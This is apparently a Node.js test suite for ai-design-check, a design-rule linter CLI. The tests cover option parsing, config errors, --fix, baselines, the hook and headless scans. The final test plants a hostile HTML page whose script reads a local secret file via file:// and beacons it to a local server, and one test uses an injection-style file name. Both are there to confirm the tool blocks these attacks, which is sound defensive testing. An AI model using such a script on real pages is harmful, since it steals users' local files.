import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { findChrome } from '../src/story.js';

const BIN = join(dirname(dirname(fileURLToPath(import.meta.url))), 'bin', 'ai-design-check.js');
const made = [];
const project = (files = {}) => {
    const dir = mkdtempSync(join(tmpdir(), 'adc-cli-'));
    made.push(dir);
    for (const [name, content] of Object.entries(files)) {
        mkdirSync(dirname(join(dir, name)), { recursive: true });
        writeFileSync(join(dir, name), content);
    }

    return dir;
};
after(() => { for (const dir of made) rmSync(dir, { recursive: true, force: true }); });
const run = (cwd, args, input) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: 'utf8', input });
// A file the checker reads with no finding in it, and one with a known error.
const CLEAN = '<p>Fine</p>\n';
const BAD = '<div class="mt-[13px]">Text</div>\n';
const spacingOf = (result) => JSON.parse(result.stdout).findings.filter((item) => item.rule === 'spacing-scale');

test('an option that is not understood stops the run', () => {
    const dir = project({ 'a.html': CLEAN });
    assert.equal(run(dir, ['--strcit']).status, 2);
    assert.equal(run(dir, ['--fix', '--dry-run=true']).status, 2);
    assert.equal(run(dir, ['--format', 'sarif']).status, 2);
    assert.equal(run(dir, ['--format']).status, 2);
});

test('-h and --version answer; a value may hold an equals sign', () => {
    const dir = project({ 'a.html': CLEAN });
    assert.match(run(dir, ['-h']).stdout, /Usage/);
    assert.match(run(dir, ['--version']).stdout, /^\d+\.\d+\.\d+/);
    run(dir, ['system', '--out=x=y', '--format', 'json']);
    assert.ok(existsSync(join(dir, 'x=y', 'tokens.css')));
});

test('a run that read nothing is not a pass', () => {
    assert.equal(run(project(), []).status, 2);
    assert.match(run(project({ 'README.md': '# x' }), []).stdout, /Nothing checked/);
    assert.equal(JSON.parse(run(project(), ['--json']).stdout).nothingChecked, true);
    const missing = run(project({ 'a.html': CLEAN }), ['no/such/path']);
    assert.equal(missing.status, 2);
    assert.match(missing.stderr, /Not found: no\/such\/path/);
    // A config file alone is not an interface.
    assert.equal(run(project({ 'tailwind.config.js': 'module.exports = {}', 'x.d.ts': '' }), []).status, 2);
    assert.match(run(project({ 'a.less': 'a{}' }), []).stdout, /1 \.less file/);
    assert.equal(run(project({ 'a.scss': 'a{}' }), []).status, 0); // SCSS is read now
});

test('init does not switch the checker off', () => {
    const dir = project({ 'app/page.html': BAD });
    run(dir, ['init']);
    assert.equal(spacingOf(run(dir, ['--json'])).length, 1);
});

test('a broken config or baseline says so and fails', () => {
    for (const [config, pattern] of [['{"rules":{"spacing-scale":"warning"}}', /severity "warning"/], ['{"ignore":"dist"}', /"ignore" must be a list/], ['{oops', /not valid JSON/]]) {
        const result = run(project({ 'a.html': BAD, 'ai-design-check.json': config }), ['--json']);
        assert.equal(result.status, 2);
        assert.match(result.stderr, pattern);
        assert.doesNotMatch(result.stderr, /\n\s+at /);
    }
    const result = run(project({ 'a.html': BAD, '.ai-design-check-baseline.json': 'nope' }), []);
    assert.equal(result.status, 2);
    assert.match(result.stderr, /--write-baseline/);
});

test('annotations cannot start a workflow command', () => {
    const dir = project({ 'a,b%.html': BAD });
    const { stdout } = run(dir, ['--format', 'github', 'a,b%.html']);
    assert.match(stdout, /file=a%2Cb%25\.html,/);
});

test('from a subfolder the project config and baseline apply', () => {
    const dir = project({ 'ai-design-check.json': '{"rules":{"spacing-scale":"off"}}', 'app/a.html': BAD, 'other/b.html': BAD });
    const result = run(join(dir, 'app'), ['--json']);
    assert.equal(spacingOf(result).length, 0);
    assert.equal(result.status, 0);
});

test('.gitignore and build folders are not read as source', () => {
    const dir = project({ 'a.html': CLEAN, '.gitignore': 'made/\n', 'made/x.html': BAD, '.next/y.html': BAD, 'coverage/z.html': BAD, 'out/w.html': BAD });
    assert.equal(spawnSync('git', ['init', '-q'], { cwd: dir }).status, 0);
    assert.equal(spacingOf(run(dir, ['--json'])).length, 0);
});

test('--fix leaves a file that is not UTF-8 untouched', () => {
    const dir = project();
    const bytes = Buffer.concat([Buffer.from('<div class="mt-[13px]">'), Buffer.from([0xfe, 0xf0, 0xfc]), Buffer.from('</div>\n')]);
    writeFileSync(join(dir, 'a.html'), bytes);
    assert.match(run(dir, ['--fix']).stdout, /not UTF-8/);
    assert.ok(readFileSync(join(dir, 'a.html')).equals(bytes));
});

test('--fix lowers the baseline, so its allowance cannot hide new findings', () => {
    const dir = project({ 'a.html': BAD });
    run(dir, ['--write-baseline']);
    run(dir, ['--fix']);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, '.ai-design-check-baseline.json'), 'utf8')).counts, {});
    writeFileSync(join(dir, 'a.html'), '<div class="mt-[17px]">Text</div>\n');
    assert.equal(spacingOf(run(dir, ['--json'])).length, 1);
});

test('--fix writes only steps Tailwind 3 has', () => {
    const dir = project({ 'a.html': '<div class="mt-[53px] mb-[13px]">Text</div>\n' });
    run(dir, ['--fix']);
    const html = readFileSync(join(dir, 'a.html'), 'utf8');
    assert.match(html, /mt-\[52px\]|mt-13|mt-\[56px\]|mt-14/);
    assert.doesNotMatch(html, /mt-13\b/);
    assert.match(html, /mb-3\b/);
});

test('the hook respects the baseline and the config ignore, and bounds what it echoes', () => {
    const dir = project({ 'a.html': BAD, 'skip/b.html': BAD, 'ai-design-check.json': '{"ignore":["skip/**"]}' });
    const hook = (file) => run(dir, ['hook'], JSON.stringify({ tool_input: { file_path: join(dir, file) } }));
    assert.equal(hook('a.html').status, 2);
    assert.equal(hook('skip/b.html').status, 0);
    run(dir, ['--write-baseline']);
    assert.equal(hook('a.html').status, 0);
});

test('nothing is written through a symbolic link', () => {
    const dir = project({ 'a.html': BAD, 'target.txt': 'mine' });
    symlinkSync(join(dir, 'target.txt'), join(dir, '.ai-design-check-baseline.json'));
    assert.equal(run(dir, ['--write-baseline', '--no-baseline']).status, 2);
    assert.equal(readFileSync(join(dir, 'target.txt'), 'utf8'), 'mine');
});

test('system does not overwrite other files, and its output passes the checker', () => {
    const dir = project({ 'design-system/theme.css': 'mine' });
    assert.notEqual(run(dir, ['system']).status, 0);
    assert.equal(readFileSync(join(dir, 'design-system/theme.css'), 'utf8'), 'mine');
    assert.equal(run(dir, ['system', '--force']).status, 0);
    assert.doesNotMatch(readFileSync(join(dir, 'design-system/theme.css'), 'utf8'), /@theme \{[^}]*color-scheme/);
    assert.equal(run(dir, ['--json', 'design-system/DesignSystem.kt']).status, 0);
});

test('rules read what they promise', () => {
    const rulesIn = (name, content) => JSON.parse(run(project({ [name]: content }), ['--json', name]).stdout).findings.map((item) => item.rule);
    // JSX in a .js file.
    assert.ok(rulesIn('a.js', 'export const A = () => { return <div className="mt-[13px]">x</div>; };\n').includes('spacing-scale'));
    // Plain JavaScript keeps being plain JavaScript.
    assert.ok(!rulesIn('b.js', 'const a = "mt-[13px]";\n').includes('spacing-scale'));
    // An icon named by its set, not by a suffix.
    assert.ok(rulesIn('c.tsx', 'import { Trash2 } from "lucide-react";\nexport const C = () => <button onClick={f}><Trash2 /></button>;\n').includes('icon-button-name'));
    // The removal is not its own replacement.
    assert.ok(rulesIn('d.html', '<button class="focus:outline-none">Go</button>\n').includes('focus-ring-removed'));
    assert.ok(!rulesIn('e.html', '<button class="outline-none focus-visible:ring-2">Go</button>\n').includes('focus-ring-removed'));
    // Commented-out markup.
    assert.ok(!rulesIn('f.html', '<!-- <div class="mt-[13px]">old</div> -->\n<p>Now</p>\n').includes('spacing-scale'));
    assert.ok(!rulesIn('g.tsx', 'export const G = () => (<div>{/* <div className="mt-[13px]">old</div> */}</div>);\n').includes('spacing-scale'));
});

test('a one-line ignore covers one line outside a tag, and a whole unfinished tag', () => {
    const code = 'export const A = () => <div>\n{/* ai-design-check-ignore-next-line spacing-scale -- why */}\n<p>x</p>\n<p className="mt-[13px]">y</p>\n</div>;\n';
    assert.equal(spacingOf(run(project({ 'a.tsx': code }), ['--json'])).length, 1);
    const tag = '<!-- ai-design-check-ignore-next-line spacing-scale -- why -->\n<div\n  class="mt-[13px]"\n>x</div>\n';
    assert.equal(spacingOf(run(project({ 'b.html': tag }), ['--json'])).length, 0);
});

test('an inlined font or image does not stall the run', () => {
    const blob = 'A'.repeat(400000);
    const dir = project({ 'a.css': `@font-face { src: url(data:font/woff2;base64,${blob}); }\n`, 'b.ts': `export const logo = "data:image/png;base64,${blob}";\nexport const c = "x" + y;\n` });
    const started = process.hrtime.bigint();
    run(dir, ['--json']);
    assert.ok(Number(process.hrtime.bigint() - started) / 1e9 < 20, 'took too long');
});

// A server that answers as asked, for the pages that must not count as checked.
const served = async (handler, work) => {
    const server = createServer(handler);
    await new Promise((done) => server.listen(0, '127.0.0.1', done));
    try {
        return await work(`http://127.0.0.1:${server.address().port}`);
    } finally {
        server.close();
    }
};
const runAsync = (cwd, args) => new Promise((done) => {
    import('node:child_process').then(({ spawn }) => {
        const child = spawn(process.execPath, [BIN, ...args], { cwd, stdio: ['ignore', 'pipe', 'pipe'] });
        let stdout = '';
        let stderr = '';
        child.stdout.on('data', (chunk) => { stdout += chunk; });
        child.stderr.on('data', (chunk) => { stderr += chunk; });
        child.on('close', (status) => done({ status, stdout, stderr }));
    });
});

test('scan and narrow fail on a page that is not there', { skip: !findChrome() }, async () => {
    const dir = project();
    assert.equal((await runAsync(dir, ['scan', 'http://127.0.0.1:9/'])).status, 1);
    await served((request, response) => {
        if (request.url === '/500') { response.writeHead(500, { 'content-type': 'text/html' }); response.end('<h1>Server error</h1>'); return; }
        if (request.url === '/json') { response.writeHead(200, { 'content-type': 'application/json' }); response.end('{}'); return; }
        response.writeHead(200, { 'content-type': 'text/html' }); response.end('<!doctype html><html><body><div id="root"></div></body></html>');
    }, async (base) => {
        const failed = await runAsync(dir, ['scan', `${base}/500`]);
        assert.equal(failed.status, 1);
        assert.match(failed.stderr, /HTTP 500/);
        assert.match((await runAsync(dir, ['scan', `${base}/json`])).stderr, /application\/json/);
        assert.match((await runAsync(dir, ['scan', `${base}/empty`])).stderr, /empty page/);
        assert.equal((await runAsync(dir, ['narrow', `${base}/500`])).status, 1);
        assert.doesNotMatch((await runAsync(dir, ['scan', `${base}/500`, '--allow-status', '500'])).stderr, /HTTP 500/);
    });
});

test('a local page cannot read local files', { skip: !findChrome() }, async () => {
    const dir = project({ 'secret.txt': 'CANARY' });
    let got = '';
    await served((request, response) => { got += decodeURIComponent(request.url); response.end(); }, async (base) => {
        writeFileSync(join(dir, 'hostile.html'), `<!doctype html><html lang="en"><body><p>Words here</p><script>
let text = 'BLOCKED';
try { const xhr = new XMLHttpRequest(); xhr.open('GET', ${JSON.stringify(`file://${join(dir, 'secret.txt')}`)}, false); xhr.send(); text = xhr.responseText; } catch {}
new Image().src = ${JSON.stringify(`${base}/?d=`)} + text;
</script></body></html>`);
        await runAsync(dir, ['narrow', 'hostile.html']);
    });
    assert.doesNotMatch(got, /CANARY/);
});
